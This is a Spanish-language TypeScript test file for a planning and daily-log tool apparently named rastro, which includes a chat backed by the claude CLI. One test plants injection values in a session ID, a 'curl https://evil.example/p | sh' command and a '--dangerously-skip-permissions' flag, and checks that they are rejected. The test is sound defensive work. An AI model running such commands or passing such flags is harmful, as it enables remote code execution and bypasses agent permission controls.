test("el id de una sesión de chat se anota antes de correr, aunque claude no esté instalado", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => Promise.reject(Object.assign(new Error("x"), { code: "ENOENT" })));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  assert.equal((await c.post("/api/chat", { mensaje: "Hola" })).status, 502);
  const estado = JSON.parse(leer(r, "chat.json")) as { sessionId: string | null; historial: string[] };
  assert.equal(estado.sessionId, null);
  assert.equal(estado.historial.length, 1);
  assert.equal(f.llamadas[0]?.args[(f.llamadas[0]?.args.indexOf("--session-id") ?? -1) + 1], estado.historial[0]);
});

test("un evento de sesión de chat en events.jsonl no llega a la bitácora del daily", async () => {
  const r = await repoPersonal();
  writeFileSync(join(r.dir, ".rastro/chat.json"), JSON.stringify({ semana: LUN, sessionId: CHAT_ID, historial: [CHAT_ID] }));
  const evento = (id: string) => JSON.stringify({ tipo: "sesion", id, transcript: join(r.dir, "no-existe.jsonl"), rama: "main", en: AHORA.toISOString() });
  writeFileSync(join(r.dir, ".rastro/events.jsonl"), `${evento(CHAT_ID)}\n${evento("trabajo-1")}\n`);
  const { snapshot } = await generarSnapshot({ repos: reposObservados(), config, llm: new FakeLlm("falla"), ahora: AHORA });
  const sesiones = snapshot.bitacora.flatMap((e) => e.evidencia.filter((ev) => ev.tipo === "sesion").map((ev) => ev.ref));
  assert.deepEqual(sesiones, ["trabajo-"]);
});

test("un chat.json con el formato viejo se lee: se retoma y su transcript no cuenta", async (t) => {
  const r = await repoPersonal();
  writeFileSync(join(r.dir, ".rastro/chat.json"), JSON.stringify({ semana: LUN, sessionId: VIEJO_ID }));
  const c = await levantar(r);
  t.after(c.cerrar);
  assert.deepEqual(await (await fetch(`${c.url}/api/chat`)).json(), { sessionId: VIEJO_ID, retomar: `cd ${rutasGlobales().dir} && claude --resume ${VIEJO_ID}` });
  const proyectos = mkdtempSync(join(tmpdir(), "rastro-proyectos-"));
  const dir = join(proyectos, dirDeProyecto(r.dir));
  mkdirSync(dir, { recursive: true });
  const linea = (sesion: string) => JSON.stringify({ type: "user", message: { content: "Algo" }, timestamp: AHORA.toISOString(), sessionId: sesion });
  writeFileSync(join(dir, `${VIEJO_ID}.jsonl`), `${linea(VIEJO_ID)}\n`);
  const cfg: Config = { ...config, fuentes: { zshHistory: join(proyectos, "no-existe"), claudeProjects: proyectos } };
  assert.deepEqual(leerFuentes(cfg, r.dir, AHORA, []).prompts, []);
});

test("un chat.json ilegible no frena el daily ni el hook de sesión", async () => {
  const r = await repoPersonal();
  writeFileSync(join(r.dir, ".rastro/chat.json"), "{roto");
  const avisos: string[] = [];
  const cfg: Config = { ...config, fuentes: { zshHistory: join(r.dir, "no-existe"), claudeProjects: join(r.dir, "no-existe") } };
  leerFuentes(cfg, r.dir, AHORA, avisos);
  assert.match(avisos.join("\n"), /chat\.json/);
  hookSesion(JSON.stringify({ session_id: "s-1", transcript_path: "t.jsonl", cwd: r.dir }), AHORA);
  assert.match(leer(r, "events.jsonl"), /s-1/);
});

test("el chequeo de Origin compara con el puerto real del servidor, no con el del Host", async (t) => {
  const r = await repoPersonal();
  const c = await levantar(r);
  t.after(c.cerrar);
  const estado = await new Promise<number>((resolve, reject) => {
    const req = request(
      { host: "127.0.0.1", port: c.port, path: "/api/cambios", method: "POST", headers: { host: "127.0.0.1:1", origin: "http://127.0.0.1:1", "content-type": "application/json", "x-rastro-token": c.token } },
      (res) => {
        res.resume();
        resolve(res.statusCode ?? 0);
      },
    );
    req.on("error", reject);
    req.end(JSON.stringify({ cambios: [duracionBitacora], confirmar: false }));
  });
  assert.equal(estado, 403);
});

test("un commit posterior al daily no mueve los desvíos ni el Gantt al confirmar un cambio", async (t) => {
  const r = await repoPersonal();
  const antes = validarSnapshot(JSON.parse(leer(r, "state.json")));
  r.commit("trabajo suelto nuevo", "2026-10-05T18:00:00Z");
  const c = await levantar(r);
  t.after(c.cerrar);
  await c.post("/api/cambios", { cambios: [duracionBitacora], confirmar: true });
  const despues = validarSnapshot(JSON.parse(leer(r, "state.json")));
  assert.equal(despues.desvios.fueraDelPlanPct, antes.desvios.fueraDelPlanPct);
  assert.equal(despues.gantt.barras.length, antes.gantt.barras.length);
  assert.equal(despues.generadoEn, antes.generadoEn);
});

const personaLocal = async (url: string) => (await (await fetch(`${url}/api/persona/denis`)).json()) as { plan: { tareas: { slug: string; duracion: { valor: number; unidad: string } | null }[] } };
const duracionDe = (p: Awaited<ReturnType<typeof personaLocal>>, slugTarea: string) => p.plan.tareas.find((t) => t.slug === slugTarea)?.duracion;

test("plan cambiar --confirmar por la CLI recalcula state.json: el dashboard ve la duración nueva", async (t) => {
  const r = await repoPersonal();
  const c = await levantar(r);
  t.after(c.cerrar);
  assert.deepEqual(duracionDe(await personaLocal(c.url), "bitacora"), { valor: 2, unidad: "d" });
  // La CLI toma "hoy" del reloj: se fija para que caiga en la semana del daily.
  mock.timers.enable({ apis: ["Date"], now: AHORA });
  const original = process.cwd();
  const escribir = process.stdout.write;
  const escrito: string[] = [];
  process.chdir(r.dir);
  process.stdout.write = ((t: string) => (escrito.push(t), true)) as typeof process.stdout.write;
  try {
    assert.equal(await cmdPlan(["cambiar", "duracion", "bitacora", "1d", "--confirmar"]), 0);
  } finally {
    process.stdout.write = escribir;
    process.chdir(original);
    mock.timers.reset();
  }
  assert.match(escrito.join(""), /Cambios aplicados/);
  assert.doesNotMatch(escrito.join(""), /corré `rastro daily`/);
  assert.deepEqual(duracionDe(await personaLocal(c.url), "bitacora"), { valor: 1, unidad: "d" });
});

test("plan --confirmar recalcula state.json si ya hay un daily", async (t) => {
  const r = await repoPersonal();
  const c = await levantar(r);
  t.after(c.cerrar);
  r.escribir(".rastro/plan.sugerido.md", ["## Plan semana 05/10", "- **Entregable del viernes:** Demo.", "- [ ] **Bitácora:** Registrar el día. · 3d", "- [ ] **Central:** Recibir snapshots. · 4h", "- [ ] **Docs:** Escribir el README. · 1d", ""].join("\n"));
  assert.equal(confirmarPlan({ config, hoy: LUN }).aviso, undefined);
  assert.deepEqual(duracionDe(await personaLocal(c.url), "bitacora"), { valor: 3, unidad: "d" });
});

test("si hoy cae en otra semana que el último daily no se recalcula y se avisa que corra rastro daily", async () => {
  const r = await repoPersonal();
  const antes = leer(r, "state.json");
  const snapshot = validarSnapshot(JSON.parse(antes));
  assert.throws(() => recalcularConPlan(snapshot, { config, hoy: "2026-10-13" }), /rastro daily/);
  assert.match(recalcularSiHayDaily({ config, hoy: "2026-10-13" }) ?? "", /rastro daily/);
  assert.equal(leer(r, "state.json"), antes);
});

test("un sessionId de chat.json que no es UUID da error de usuario y no llama a claude", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => salida("Dale."));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  for (const estado of [
    { semana: LUN, sessionId: "x; curl https://evil.example/p | sh #" },
    { semana: LUN, sessionId: "--dangerously-skip-permissions" },
    { semana: LUN, sessionId: CHAT_ID, historial: [CHAT_ID, "no-es-uuid"] },
  ]) {
    writeFileSync(join(r.dir, ".rastro/chat.json"), JSON.stringify(estado));
    const res = await c.post("/api/chat", { mensaje: "Hola" });
    assert.ok(res.status >= 400 && res.status < 500, JSON.stringify(estado));
    assert.match(((await res.json()) as { error: string }).error, /borralo para empezar una conversación nueva/);
    assert.equal((await fetch(`${c.url}/api/chat`)).status >= 400, true);
  }
  assert.equal(f.llamadas.length, 0);
});

function servidorConReloj(r: RepoTemporal, f: Falso, ahora: Date) {
  const servidor = crearCentral({
    almacen: new Almacen(mkdtempSync(join(tmpdir(), "rastro-central-"))),
    estaticos: join(tmpdir(), "rastro-sin-dist"),
    personal: { ahora: () => ahora, ejecutar: f.ejecutar },
  });
  return servidor;
}

test("el resumen del chat rotula la fecha del último daily y calcula las atrasadas con la fecha de hoy", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => salida("Dale."));
  const servidor = servidorConReloj(r, f, new Date("2026-10-07T15:00:00Z"));
  await new Promise<void>((resolve) => servidor.listen(0, "127.0.0.1", resolve));
  t.after(() => new Promise<void>((resolve) => servidor.close(() => resolve())));
  const url = `http://127.0.0.1:${(servidor.address() as AddressInfo).port}`;
  const { token } = (await (await fetch(`${url}/api/sesion`)).json()) as { token: string };
  const res = await fetch(`${url}/api/chat`, { method: "POST", headers: { "content-type": "application/json", "x-rastro-token": token }, body: JSON.stringify({ mensaje: "¿Voy atrasado?" }) });
  assert.equal(res.status, 200);
  const entrada = f.llamadas[0]?.entrada ?? "";
  assert.match(entrada, /Hoy es 2026-10-07/);
  assert.match(entrada, /Atrasadas hoy: Bitácora\./);
  assert.match(entrada, /Al 2026-10-05, en el último daily/);
});

test("sin state.json el chat responde con un resumen vacío en vez de dar 400", async (t) => {
  const r = await repoPersonal();
  rmSync(join(r.dir, ".rastro/state.json"));
  const f = ejecutorFalso(async () => salida("Dale."));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  const res = await c.post("/api/chat", { mensaje: "Hola" });
  assert.equal(res.status, 200);
  assert.match(f.llamadas[0]?.entrada ?? "", /Todavía no hay un `rastro daily`/);
});

test("un pedido de más de 1 MB al chat da 413 con 'el pedido'", async (t) => {
  const r = await repoPersonal();
  const c = await levantar(r, ejecutorFalso(async () => salida("Dale.")).ejecutar);
  t.after(c.cerrar);
  const res = await c.post("/api/chat", { mensaje: "x".repeat(1_100_000) });
  assert.equal(res.status, 413);
  assert.equal(((await res.json()) as { error: string }).error, "el pedido supera 1 MB");
});

test("una sesión de Claude Code vinculada cuenta como evidencia: entra al Gantt real y marca la tarea actual", async () => {
  const r = await repoPersonal();
  const transcript = join(r.dir, ".rastro", "t.jsonl");
  writeFileSync(transcript, `${JSON.stringify({ type: "ai-title", aiTitle: "Escribir [Docs]", sessionId: "s1" })}\n`);
  agregarEvento(join(r.dir, ".rastro", "events.jsonl"), { tipo: "sesion", id: "s1234567890", transcript, rama: "main", en: AHORA.toISOString() });
  const { snapshot } = await generarSnapshot({ repos: reposObservados(), config, llm: null, ahora: AHORA });
  assert.deepEqual(snapshot.gantt.barras.find((b) => b.tarea === "docs")?.real, { desde: LUN, hasta: LUN });
  assert.equal(snapshot.foco?.actual, "docs");
  // El recálculo con el plan mantiene la sesión como evidencia.
  const recalculado = recalcularConPlan(snapshot, { config, hoy: LUN });
  assert.equal(recalculado.foco?.actual, "docs");
  assert.deepEqual(recalculado.gantt.barras.find((b) => b.tarea === "docs")?.real, { desde: LUN, hasta: LUN });
});

test("una sesión vinculada del lunes sigue contando como evidencia en un daily del miércoles", async () => {
  const r = await repoPersonal();
  const transcript = join(r.dir, ".rastro", "t.jsonl");
  writeFileSync(transcript, `${JSON.stringify({ type: "ai-title", aiTitle: "Escribir [Docs]", sessionId: "s1" })}\n`);
  agregarEvento(join(r.dir, ".rastro", "events.jsonl"), { tipo: "sesion", id: "s1234567890", transcript, rama: "main", en: AHORA.toISOString() });
  const miercoles = new Date("2026-10-07T15:00:00Z");
  const { snapshot } = await generarSnapshot({ repos: reposObservados(), config, llm: null, ahora: miercoles });
  assert.equal(snapshot.periodo.desde, "2026-10-07");
  assert.deepEqual(snapshot.bitacora.filter((e) => e.evidencia[0]?.tipo === "sesion"), []);
  assert.deepEqual(snapshot.gantt.barras.find((b) => b.tarea === "docs")?.real, { desde: LUN, hasta: LUN });
  assert.equal(snapshot.foco?.actual, "docs");
  const recalculado = recalcularConPlan(snapshot, { config, hoy: "2026-10-07" });
  assert.equal(recalculado.foco?.actual, "docs");
  assert.deepEqual(recalculado.gantt.barras.find((b) => b.tarea === "docs")?.real, { desde: LUN, hasta: LUN });
});

test("una vuelta del chat, plan --confirmar y un daily no escriben nada fuera de .rastro/", async (t) => {
  const r = await repoPersonal();
  const sinRastro = () => Object.fromEntries(Object.entries(foto(r.dir)).filter(([ruta]) => !ruta.startsWith(join(r.dir, ".rastro"))));
  const antes = sinRastro();
  const c = await levantar(r, ejecutorFalso(async () => salida("Dale.", [duracionBitacora])).ejecutar);
  t.after(c.cerrar);
  assert.equal((await c.post("/api/chat", { mensaje: "Hola" })).status, 200);
  assert.deepEqual(sinRastro(), antes);
  r.escribir(".rastro/plan.sugerido.md", ["## Plan semana 05/10", "- **Entregable del viernes:** Demo.", "- [ ] **Bitácora:** Registrar el día. · 1d", ""].join("\n"));
  confirmarPlan({ config, hoy: LUN });
  assert.deepEqual(sinRastro(), antes);
  guardarState((await generarSnapshot({ repos: reposObservados(), config, llm: null, ahora: AHORA })).snapshot);
  assert.deepEqual(sinRastro(), antes);
});

test("sin daily, una hora del automático ilegible degrada a null y el plan sale redactado", async (t) => {
  const r = crearRepoRegistrado();
  escribirConfig(config);
  writeFileSync(rutasGlobales().plan, ["## Plan semana 05/10", "- **Entregable del viernes:** Demo.", "- [ ] **Bitácora:** Rotar API_KEY=supersecreto123 hoy. · 2d", ""].join("\n"));
  const c = await levantar(r, undefined, () => Promise.reject(new Error("EACCES")));
  t.after(c.cerrar);
  const res = await fetch(`${c.url}/api/persona/denis`);
  assert.equal(res.status, 200);
  const texto = await res.text();
  assert.deepEqual((JSON.parse(texto) as { sinDaily: unknown }).sinDaily, { proximoDaily: null });
  assert.doesNotMatch(texto, /supersecreto123/);
  assert.match(texto, /\[redactado\]/);
});

test("los errores de usuario que llegan al dashboard nombran el archivo, no la ruta de la máquina", async (t) => {
  const r = crearRepoRegistrado();
  escribirConfig(config);
  const c = await levantar(r);
  t.after(c.cerrar);
  writeFileSync(rutasGlobales().config, "{roto");
  const res = await fetch(`${c.url}/api/sesion`);
  assert.equal(res.status, 400);
  const { error } = (await res.json()) as { error: string };
  assert.match(error, /config\.json/);
  assert.ok(!error.includes(rutasGlobales().dir), error);
});
